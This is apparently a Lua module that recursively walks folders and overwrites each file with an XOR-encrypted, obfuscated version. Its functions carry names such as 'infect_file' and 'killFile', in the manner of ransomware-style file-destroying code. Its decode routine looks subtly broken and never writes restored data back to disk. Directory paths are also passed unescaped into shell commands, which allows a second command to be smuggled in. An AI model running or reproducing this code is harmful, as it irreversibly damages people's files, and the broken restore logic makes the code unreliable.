math.randomseed(os.time())

local module = {}

local kr  = 10
local kr2 = kr
local key = math.random(10*kr2,3000*kr2)/kr
local cmb = {"q","w","@","^","S","g","f","j","n",":"}
local e   = cmb[ math.floor((key % 1) * #cmb) + 1 ]

function module.generateKey()
    return (tostring(math.random(1111,9999)))..(string.rep(cmb[math.random(1,#cmb)],3))
end

local function printd(t)
    -- print(t)
end

local function printd2(t)
    -- print(t)
end

local function dbgT()
    local current_datetime = os.clock()
    printd2(current_datetime)
end

local function make_keystream(passphrase)
    local ks = {}
    for i = 1, #passphrase do
        ks[#ks+1] = passphrase:byte(i)
    end
    return ks
end

local function xor_bytes(data, passphrase)
    local ks = make_keystream(passphrase)
    local ks_len = #ks
    local out = {}

    for i = 1, #data do
        local b = data:byte(i)
        local k = ks[(i - 1) % ks_len + 1]
        out[i] = string.char(bit32.bxor(b, k))
    end

    return table.concat(out)
end

local function infectMn1(text, amt, delimiter)
    local function encode_pass(t)
        local out = {}
        local bts = {}

        for i = 1, #t do
            local ch  = t:sub(i,i)
            local bbs = bts[ch] or string.byte(ch)
            bts[ch]   = bbs
            out[#out+1] = tostring(bbs) .. delimiter
        end

        return table.concat(out):reverse()
    end

    local t = text
    for _ = 1, amt do
        t = encode_pass(t)
    end

    local header = "DELIM="..delimiter.."\nPASSES="..amt.."\n"
    return header .. t
end

local function decode_file(text)
    if not text then return nil end

    local delim  = text:match("DELIM=(.-)\n")
    local passes = tonumber(text:match("PASSES=(%d+)\n"))
    local body   = text:match("PASSES=%d+\n(.+)$")

    if not delim or not body or not passes then
        return nil
    end

    local function decode_pass(t)
        local rev = t:reverse()
        local out = {}

        for num in rev:gmatch("(%d+)" .. delim) do
            out[#out+1] = string.char(tonumber(num))
        end

        return table.concat(out)
    end

    local t = body
    for _ = 1, passes do
        t = decode_pass(t)
    end

    return t
end

local function infect_file(dir, passphrase, text)
    local original
    
    if not text then
        local f = io.open(dir, "rb")
        if not f then
            printd("Read error")
            return
        end

        original = f:read("*a")
        f:close()
    else
        original = dir
    end

    printd("Original:")
    printd(original)
    
    local encrypted = xor_bytes(original, passphrase)

    local amt = 1
    local infected = infectMn1(encrypted, amt, e)
    
    if not text then
        local fw = io.open(dir, "wb")
        if not fw then
            printd("Write error")
            return
        end
        fw:write(infected)
        fw:close()
    end
    
    printd("\nFile encrypted.")
    
    if text then return infected end
end

local function decodeStep(dir, passphrase, isText)
    local text = ""
    
    if not isText then
        local f = io.open(dir,"rb")
        if not f then
            printd("Read error")
            return
        end

        text = f:read("*a")
        f:close()
    else
        text = dir
    end
    
    local decoded = decode_file(text)
    if not decoded then
        printd("Decode header failed")
        return nil
    end
    
    local plain = xor_bytes(decoded, passphrase)

    printd("\nDecoded:")
    printd(plain or "<nil>")
    
    if not text then
        local f2 = io.open(dir,"wb")
        if not f2 then
            printd("Write error")
            return nil
        end
        f2:write(plain)
        f2:close()
    end
    
    return plain
end

local function killFile(dir, times, passphrase, text)
    local d
    
    for _ = 1, 1 + (times or 1) do
        d = infect_file(dir, passphrase, text)
    end
    
    return d
end

local function decode(dir, passphrase, text)
    local d = true
    local df = "This is already debugged!"
    
    while true do
        d = decodeStep(dir, passphrase, text)
        if not d then
            break
        else
            df = d
        end
    end
    
    return df
end

local function getFileExtension(filename)
    return filename:match("^.+(%..+)$") or ""
end

local function is_windows()
    dbgT()
    return package.config:sub(1,1) == "\\"
end

local function get_child_files(path)
    dbgT()

    local files = {}
    local cmd

    if is_windows() then
        cmd = string.format('dir /b /a-d "%s"', path)
    else
        cmd = string.format('ls -p "%s" | grep -v /', path)
    end

    local p = io.popen(cmd)
    if not p then
        error("Failed to run directory listing command")
    end

    for file in p:lines() do
        files[#files+1] = file
    end

    p:close()
    dbgT()

    return files
end

local function fileBit(dir, mode, p, text)
    local passphrase = p.passphrase or "default-secret"

    if mode == 1 then
        return decode(dir, passphrase, text)
    elseif mode == 2 then
        return killFile(dir, p.times or 1, passphrase, text)
    end
end

function module.process(dir, mode, p)
    p = p or {}
    local ext = getFileExtension(dir)

    if ext == "" or #ext > 5 then
        printd2("Folder: "..dir)
        for _, v in ipairs(get_child_files(dir)) do
            local trueDir = dir .. "\\" .. v
            module.process(trueDir, mode, p)
        end
    else
        printd2((string.upper(string.sub(ext,2,2))..string.sub(ext,3,#ext))..": "..dir)
        fileBit(dir, mode, p)
    end
end

function module.processText(text, mode, p)
    return fileBit(text, mode, p, true)
end

return module
